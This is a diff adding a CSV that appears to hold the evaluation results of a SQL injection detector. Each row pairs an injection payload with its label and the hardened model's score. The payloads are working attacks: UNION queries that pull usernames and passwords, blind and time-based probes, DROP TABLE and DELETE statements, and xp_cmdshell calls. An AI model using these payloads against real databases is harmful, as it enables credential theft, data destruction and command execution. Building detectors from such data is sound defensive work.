@@ -1,0 +1,209 @@
+payload,label,hardened_pred_label,hardened_pred_score
+--'; WAITFOR DELAY '0:0:10'; SELECT 1=1,1,1,0.9999932
+'; EXEC sp_executesql N'SELECT * FROM users WHERE 1=1' --,1,1,0.9999933
+1' AND (SELECT COUNT(*) FROM users WHERE user_id = (SELECT MAX(user_id) FROM users)) --,1,1,0.9999931
+"' AND SLEEP(FLOOR(ABS(RAND()*MAX(CASE WHEN SUBSTRING(status, 1, 1)='P' THEN 1 ELSE 0 END)))) --",1,1,0.9999933
+--); IF ( 1 = 1 ) PRINT 'Injection Successfull' ELSE PRINT 'No Injection' --,1,1,0.9999932
+)) OR 1=1 --,1,1,0.9999931
+"--' UNION ALL SELECT NULL,NULL --",1,1,0.9999932
+"--or(substring(@@version,1,1)>='8')#",1,1,0.9999927
+"%23SELECT%20DBMS_CRYPTO.DES_DECRYPT(UTL_RAW.CAST_TO_RAW('%23'),TO_CHAR(2))--",1,1,0.99999213
+%' ANDCHAR( 48) = CHAR( 48),1,1,0.9999932
+' OR EXISTS(SELECT 1 FROM users WHERE username IS NOT NULL) --,1,1,0.9999932
+"1' UNION ALL SELECT CONCAT(email, '@domain.com') FROM users--",1,1,0.9999932
+"1 AND 1=(SELECT IIF(SUBSTRING((SELECT user_name FROM sysusers WHERE user_id=1), 1, 1)='sa', 1, 0))--",1,1,0.9999932
+--# AND 1>0;,1,1,0.9999925
+' AND 1=1; DROP TABLE users; --,1,1,0.9999932
+"UNION/**/SELECT/**/NULL,/**/'注入成功'--",1,1,0.9999931
+"1' AND ASCII(SUBSTRING(password, 1, 1)) > 100--",1,1,0.9999933
+--' AND EXISTS(SELECT * FROM users WHERE username=CHAR(97) + CHAR(100) + CHAR(109) + CHAR(101) + CHAR(110) LIMIT 1) --,1,1,0.9999932
+--' UNION ALL SELECT * FROM users --,1,1,0.9999932
+"' OR IF(ASCII(SUBSTRING(password,1,1)) > 90,SLEEP(5),NULL)--",1,1,0.9999933
+'# OR '#='#',1,1,0.9999931
+) + ascii('a') + ascii('d') + ascii('m') + ascii('a'); --,1,1,0.9999932
+"1' AND SUBSTRING(body, 1, 1) IN ('<','>') --",1,1,0.9999933
+"1' UNION ALL SELECT * FROM users --""",1,1,0.9999932
+' OR 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM users)--,1,1,0.9999931
+"1 AND BENCHMARK(1000000, SHA1('')) --",1,1,0.9999925
+%23 AND (SELECT COUNT(*) FROM users AS u JOIN roles AS r ON u.role_id = r.id WHERE r.name = 'admin') --,1,1,0.99998975
+"1' XOR (SELECT ASCII(SUBSTRING(database_name,1,1)) FROM information_schema.databases LIMIT 1) --",1,1,0.99999297
+' OR 0=0;,1,1,0.99999297
+-- ) AS alias WHERE 1=1 AND 1=(WAITFOR DELAY '0:0:10'),1,1,0.9999931
+"1' UNION ALL SELECT NULL, (CHAR(66)||CHAR(67)||CHAR(79)||CHAR(101)), NULL --",1,1,0.9999933
+'; DROP TABLE IF EXISTS Users;--,1,1,0.9999931
+' OR 'b'='b',1,1,0.9999931
+-- OR (CHAR(85)%2BCHAR(80)%2BCHAR(65)%2BCHAR(78)%2BCHAR(68))%20LIKE%20('%,1,1,0.9999933
+(CASE WHEN (SELECT 1 FROM users WHERE username='admin') THEN 1 ELSE 2 END); --,1,1,0.9999927
+' OR 1=1 AND EXISTS((SELECT (CASE WHEN 1=1 THEN 1 ELSE 0 END) FROM users))--,1,1,0.9999933
+'; INSERT INTO passwords SELECT password FROM users WHERE username='admin'; --,1,1,0.9999926
+OR (CASE WHEN USER LIKE 'admin%' THEN 'x' ELSE NULL END) IS NOT NULL --,1,1,0.9999933
+' OR username LIKE '%admin%'--,1,1,0.9999932
+"' and 1=1;--
+' OR 1=1;--",1,1,0.9999933
+"' OR DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5) --",1,1,0.9999932
+/*; EXECUTE IMMEDIATE 'UPDATE comments SET user_id = 1 WHERE user_id = 2'; */;,1,1,0.9999292
+"1' AND (SELECT SUBSTRING(VERSION(),1,1) AS version FROM DUAL) --",1,1,0.9999931
+1' AND (SELECT 1 FROM users WHERE username LIKE '%admin%') --,1,1,0.9999932
+1' AND SLEEP(5)--,1,1,0.9999931
+1'/**/AND/**/NULL=NULL--,1,1,0.9999932
+") UNION ALL SELECT NULL,NULL,'A'--",1,1,0.9999932
+"-- AND ASCII(SUBSTRING(username,2,1))>97",1,1,0.99999094
+' OR 1=1 UNION SELECT d.data FROM data_tables d WHERE 1=1 #,1,1,0.9999932
+' OR CAST('true' AS VARCHAR) = 'false'--,1,1,0.9999933
+' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM dual)<>1,1,1,0.9999926
+'; IF 1=1 SELECT * FROM customers FOR UPDATE; --,1,1,0.99999225
+"' OR 1=1 UNION ALL SELECT NULL, NULL, (SELECT COUNT(*) FROM users), NULL --",1,1,0.9999933
+-- - OR 1=2 OR 1=2 --,1,1,0.9999932
+1' AND 1=1; DECLARE @x VARCHAR(100); SET @x = CHAR(66) + CHAR(67) + CHAR(79) + CHAR(101); EXEC (@x)--,1,1,0.9999931
+' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END FROM (SELECT * FROM users WHERE username='admin'))--,1,1,0.9999932
+"'a' AND CHAR(97) = ASCII(SUBSTRING((SELECT user_name FROM users WHERE id = 1), 1, 1));",1,1,0.9999931
+' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name = 'users'),1,1,0.99999297
+1 AND 1=1/*',1,1,0.99999285
+1 OR 1 = 1 --,1,1,0.99999297
+"1\' OR 1=1 /*""]",1,1,0.9999931
+1') AND EXISTS(SELECT 1 FROM (SELECT COUNT(*) FROM users WHERE username='admin')) --,1,1,0.99999297
+%27%20LIKE%20'%25--,1,1,0.9999933
+1' AND status LIKE '%',1,1,0.9999931
+"') UNION ALL SELECT name, address FROM customers WHERE account_status = 'active';#",1,1,0.99999046
+"%'; ORASCII(SUBSTRING((SELECTpasswordFROMusersWHEREid=1LIMIT1),1,1))>80--",1,1,0.9999933
+"'); DECLARE @t INT SET @t=1 WHILE @t<1000 BEGIN SELECT DBMS_PIPE.RECEIVE_MESSAGE('BCOE',5); SET @t=@t+1 END; --",1,1,0.9999907
+"' UNION SELECT NULL, username, password, NULL FROM admin --",1,1,0.99999297
+"1' AND 1=1;""",1,1,0.9999931
+"1' XOR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1))<50 AND '1'='1",1,1,0.9999932
+%' OR EXISTS(SELECT 1 FROM sys.objects WHERE type = 'U' AND name LIKE '%users%' AND 1=1),1,1,0.9999932
+"' AND ASCII(SUBSTRING((SELECT user FROM sys.sysusers WHERE name='sa'), 1, 1)) > 90 --",1,1,0.9999932
+' AND 1=1 OR (SELECT 1 FROM dual WHERE 1=1) --,1,1,0.9999932
+; DROP TABLE admins --,1,1,0.99999285
+-- AND (SELECT 1 FROM users WHERE user_id = (SELECT 1 WHERE exists(SELECT * FROM users WHERE username = 'admin'))),1,1,0.999985
+-- ' OR 1=1 /*,1,1,0.9999931
+"--' AND 1=1 UNION ALL SELECT 1,(SELECT SYSDBA FROM dual),(SELECT SYSOPER FROM dual),(SELECT DBA FROM dual)",1,1,0.9999932
+' AND 3580 = ( SELECT 1 FROM information_schema.tables WHERE table_schema = DATABASE() AND table_name LIKE 'ord%' ) --,1,1,0.9999932
+--' AND 1=1,1,1,0.99999297
+"OR '1'>'1' --#""",1,1,0.9999932
+';--',1,1,0.99999094
+"' UNION ALL SELECT table_name, column_name FROM information_schema.columns --",1,1,0.9999932
+"' OR EXISTS(SELECT * FROM sysobjects WHERE xtype='U' AND name IN ('users', 'user_info')) AND CAST(COUNT(*) AS CHAR) != 0 --",1,1,0.9999932
+"--); SELECT * FROM ( SELECT name, price FROM products WHERE name LIKE '%' UNION ALL SELECT 'Exploit', 0 ) p --",1,1,0.9999894
+--%'; WAITFOR DELAY '0:0:5'); --,1,1,0.9999933
+;' AND (SELECT 1 FROM (SELECT 1) UNION SELECT 0) --,1,1,0.9999932
+' OR 1=1 --,1,1,0.9999931
+' AND EXISTS(SELECT 1 FROM users WHERE username = 'admin' AND password = 'password') --,1,1,0.9999932
+"--(' OR 1=1 AND LENGTH(Sys.fn_my_permissions(NULL,'DATABASE')) > 0--",1,1,0.9999933
+'1' OR SLEEP(5)--,1,1,0.9999932
+"1' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users') > 0; --""",1,1,0.9999932
+"[""%\' AND CHAR(48) = CHAR(48)--"", ""% OR (CAST('true' AS BIT)) /*"", ""%/*'XOR'CHAR(85)+CHAR(65)*/=*/'U'||'A', ""%\' UNION SELECT NULL,NULL,NULL,#"", ""%\' OR SUBSTRING((SELECT DATABASE()), 1, 1) = \'M\'--""]",1,1,0.9999931
+'; EXEC sp_delete_user 'user',1,1,0.9999932
+' OR 'x'='x',1,1,0.9999931
+1' AND 1=1 HAVING 2+2=4;,1,1,0.9999932
+";/*#*//*!*/EXECUTE/**/STATEMENT/**/CONCAT('DROP',/**/'TABLE',/**/'IF',/**/'EXISTS',/**/'orders'));--""",1,1,0.9999932
+' OR (username LIKE '%A%' AND user_id IN (SELECT user_id FROM admin));,1,1,0.9999932
+' OR Sleep(10),1,1,0.99999285
+"' OR 1=1 UNION ALL SELECT NULL AS username, UNHEX(REPLACE(SHA2(password, 256), '-', '')) AS password FROM users --",1,1,0.9999932
+1' /* XOR */ AND 1=1 --,1,1,0.9999932
+"/*' UNION ALL SELECT NULL, NULL, (SELECT (CASE WHEN (EXISTS(SELECT 1 FROM users LIMIT 1)) THEN 1 ELSE 0 END))--*/",1,1,0.99999297
+' OR 1=1 AND DBMS_LOCK.SLEEP(5),1,1,0.9999931
+"--; DBMS_LOCK.ALLOCATE_UNIQUE('lock_name', lock_handle); DBMS_LOCK.SLEEP(10); DBMS_LOCK.RELEASE(lock_handle); --",1,1,0.99999225
+' OR (SELECT 1 FROM users WHERE id=('1'+'0')) --,1,1,0.9999932
+"/*' OR */1=1 UNION ALL SELECT username, password FROM users",1,1,0.9999932
+(SELECT @@VERSION) OR ',1,1,0.99872535
+"[""' OR 1=1 --""",1,1,0.9999932
+"1';/**/SELECT 1 FROM users WHERE 1=1/**/""",1,1,0.9999918
+-- WAITFOR DELAY '0:0:5',1,1,0.99999034
+"(SELECT (CASE WHEN 1=1 THEN (SELECT group_concat(password SEPARATOR ',') FROM users) ELSE '' END))",1,1,0.9997398
+"' OR 1=1 UNION SELECT NULL, admin_password FROM admins;",1,1,0.9999931
+-- -1' AND (LENGTH((SELECT username FROM users ORDER BY id LIMIT 1 OFFSET 0))>4),1,1,0.9999931
+' OR 1 = 1 --,1,1,0.9999931
+"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_updatestats; --",1,1,0.9999933
+"' OR username='admin' AND (SELECT IF(1=1, (SELECT GROUP_CONCAT(username, ':', password) FROM users), NULL))--",1,1,0.9999932
+' UNION SELECT user FROM information_schema.tables WHERE table_schema='database_name'--,1,1,0.99999297
+(SELECT COUNT(*) FROM information_schema.tables WHERE table_type='BASE TABLE')--,1,1,0.9999244
+' OR 'x'='x' AND username LIKE '%a%'--,1,1,0.9999933
+"' UNION SELECT email, phone FROM customers --",1,1,0.99999154
+"1' UNION SELECT username, password FROM users--",1,1,0.9999931
+"%\' OR (SELECT COUNT(*) FROM (SELECT UPPER('a')) AS t WHERE 1=1)""",1,1,0.9999931
+";BENCHMARK(3000000,ENCODE('admin','password'))--;",1,1,0.9999931
+#' OR (SELECT CASE WHEN 4747=4747 THEN 1 ELSE 0 END FROM users WHERE username=#--admin#,1,1,0.9999931
+' AND EXISTS(SELECT * FROM users WHERE username='admin') --,1,1,0.9999931
+' OR '1'='1',1,1,0.9999931
+"') UNION ALL SELECT NULL, NULL, NULL, NULL --",1,1,0.9999932
+1' AND (SELECT 1 FROM users WHERE username = 'admin') = 1;,1,1,0.9999926
+'; EXEC xp_cmdshell 'ping 127.0.0.1' --,1,1,0.9999933
+);/**/) OR 1=1;--,1,1,0.9999932
+(SELECT /**/'x' FROM users WHERE username /**/= 'admin');,1,1,0.9944284
+' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%'),1,1,0.9999931
+"UNION SELECT 1 , 2 --",1,1,0.99999285
+"// ' OR 2>1 AND BENCHMARK(1000000, SHA('abc'))",1,1,0.99999297
+' or 1=1--',1,1,0.9999932
+--' AND 1 IN (SELECT 1 FROM products WHERE price < (SELECT MAX(price) FROM products))--,1,1,0.9999932
+'; EXEC xp_cmdshell 'ipconfig'; --,1,1,0.9999932
+"--' UNION SELECT 1, 2, (SELECT username || ':' || password FROM users), 4 --",1,1,0.9999933
+"--' UNION ALL SELECT NULL, NULL, (SELECT COUNT(*) FROM users WHERE username<> '')--",1,1,0.9999931
+-- OR 1=1/**/,1,1,0.99999297
+/*' OR 1=1 --*/,1,1,0.9999932
+'/* OR */'1'='1',1,1,0.9999932
+-- OR 1=1,1,1,0.9999926
+"--' UNION SELECT NULL, NULL --",1,1,0.9999932
+"' AND 1=1 UNION ALL SELECT username, password FROM users --",1,1,0.9999933
+-- OR (SELECT 1 FROM sys.host_summary WHERE host LIKE 'localhost'),1,1,0.99998534
+"-- ' OR 1=1 AND BENCHMARK(1000000, CONCAT('x', username)) --",1,1,0.9999933
+"(1) UNION SELECT NULL, NULL, NULL, CONCAT(password, ' from admin') FROM admin#",1,1,0.99999225
+\' AND 0<>(SELECT COUNT(*) FROM users WHERE username LIKE \'%\') --,1,1,0.9999931
+"/**/--%20OR%20(LENGTH(username)-LENGTH(REPLACE(username,'admin','')))>=1",1,1,0.9999925
+' OR LENGTH((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE())) > 0 --,1,1,0.9999932
+"1' AND (SELECT IF(1=1, BENCHMARK(5000000, ENCODE('admin', 'password')), 'no')) --",1,1,0.9999932
+) OR NOT EXISTS(SELECT 1 FROM products WHERE price < (SELECT AVG(price) FROM products)) --,1,1,0.9999931
+"1' AND (SELECT SUM(ascii(substring(username, 1, 1))) FROM admins WHERE admin_id=1) > 0 --",1,1,0.9999932
+"#' OR ((ascii(substring((select user()),1,1)) > 100)",1,1,0.9999932
+"') UNION SELECT username || ',' || password FROM users --",1,1,0.9999932
+--); WITH tmp AS ( SELECT * FROM products ) DELETE FROM tmp WHERE name LIKE '%admin%' --),1,1,0.99999213
+(SELECT * FROM users WHERE username = '' AND password LIKE '%#'),1,1,0.9841011
+(SELECT password FROM users WHERE username = 'admin' LIMIT 1) --,1,1,0.9990369
+"1'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL,NULL,NULL/**/FROM/**/orders--",1,1,0.9999932
+1/*comment*/;EXEC('ALTER USER admin WITH PASSWORD ''password'''),1,1,0.99998355
+1' OR 1=1 --#,1,1,0.9999932
+'; SLEEP(5) --,1,1,0.99999297
+"' OR ASCII(SUBSTRING(username, 1, 1)) > 97 AND BENCHMARK(1000000, CONCAT('x', username)) --",1,1,0.9999933
+"1' UNION SELECT username, password FROM admin --",1,1,0.99999297
+"' OR 1=(CASE WHEN ASCII(SUBSTRING(@@servername,1,1))=86 THEN 1 ELSE 0 END) --",1,1,0.9999933
+' OR (SELECT 6283*6283) = 6283*6283 --,1,1,0.9999932
+'; DROP TABLE orders; --,1,1,0.99999297
+'; DROP TABLE IF EXISTS sensitive_data; --,1,1,0.9999932
+1' /* ignore this part */ AND 1=1 --,1,1,0.9999932
+"'; INSERT INTO logs VALUES('injection','admin');--",1,1,0.9999931
+' AND (SELECT CAST(COUNT(*) AS VARCHAR) FROM information_schema.tables INNER JOIN information_schema.columns ON information_schema.tables.table_name = information_schema.columns.table_name) --,1,1,0.99998915
+-- ' OR 1=1 AND SLEEP(5),1,1,0.9999932
+--1'/*' OR 1=1--,1,1,0.9999932
+"%20OR%20(SUBSTRING(CAST(password AS VARCHAR(10)),1,1)%20='%23')",1,1,0.9999933
+-- WAITFOR DELAY '00:00:10',1,1,0.9999907
+*/; DELETE FROM comments WHERE user_id = 1; --,1,1,0.9999931
+"1' OR (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users WHERE username = 'admin') = 97 #",1,1,0.99999297
+"-- OR status IN ('pending', 'active')",1,1,0.9999852
+' OR 1=CAST((BINARY(0x31)) AS UNSIGNED) --,1,1,0.9999932
+) OR 1>1 /*,1,1,0.99999297
+1';/**/SELECT 1 FROM users WHERE 1=1/**/',1,1,0.99999213
+"%23 UNION ALL SELECT NULL, NULL, NULL, NULL--",1,1,0.9999932
+) AND username >= CHAR(97),1,1,0.99998665
+"1=LENGTH((SELECT GROUP_CONCAT(id, '-', name) FROM users WHERE id IN (1,2,3,4,5))) - ((SELECT 1 UNION SELECT 2) LIMIT 1)",1,1,0.9997762
+"--' UNION SELECT 1, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE database())--",1,1,0.9999932
+-- WAITFOR DELAY '0:0:3'; --,1,1,0.99999297
+'; DROP TABLE products --,1,1,0.9999927
+' OR 1=1 --',1,1,0.9999932
+"' UNION SELECT SUBSTRING(username, 1, 5), password FROM admin --",1,1,0.99999297
+' OR 'a'='a',1,1,0.9999931
+OR TRUE--,1,1,0.99999225
+OR '1' LIKE '1' AND '0'='0' UNION ALL SELECT * FROM customers WHERE state = 'CA,1,1,0.9999932
+"--' UNION SELECT NULL, NULL, (SELECT 1 FROM users WHERE username='admin'), NULL --",1,1,0.9999931
+"OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%users%' AND table_schema='public'); IF (EXISTS(SELECT * FROM users WHERE username='admin')) WAITFOR DELAY '0:0:5'; --""",1,1,0.99999225
+"' OR ('1' LIKE '1' AND SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1)>'a')",1,1,0.9999933
+'; SLEEP(5);--,1,1,0.99999297
+"--/**/'/**/OR/**/ASCII(SUBSTRING(CURRENT_DB(),1,1))>90",1,1,0.9999931
+1; EXECUTE ('DELETE FROM users WHERE id>0')--,1,1,0.9999932
+"' AND 1=(SELECT COUNT(*) FROM users WHERE SUBSTRING(username, 1, 1) = 'a') --",1,1,0.9999932
+' OR 'a'='a' --,1,1,0.9999932
+--'; INSERT INTO logs VALUES ('attack'); --,1,1,0.9999925
+1; UPDATE users SET password='' WHERE username='admin'; --,1,1,0.999992
+"[""%\' AND SLEEP(5) --""",1,1,0.9999931
+; EXEC xp_cmdshell 'ping -n 6 127.0.0.1';--,1,1,0.9999932
+"' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) > 97 --",1,1,0.9999932
+%'; XOR (SELECTCASEWHEN(COUNT(*)FROMproducts)>0THEN1ELSE0END) --,1,1,0.9999931
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password') > 0 --,1,1,0.9999932
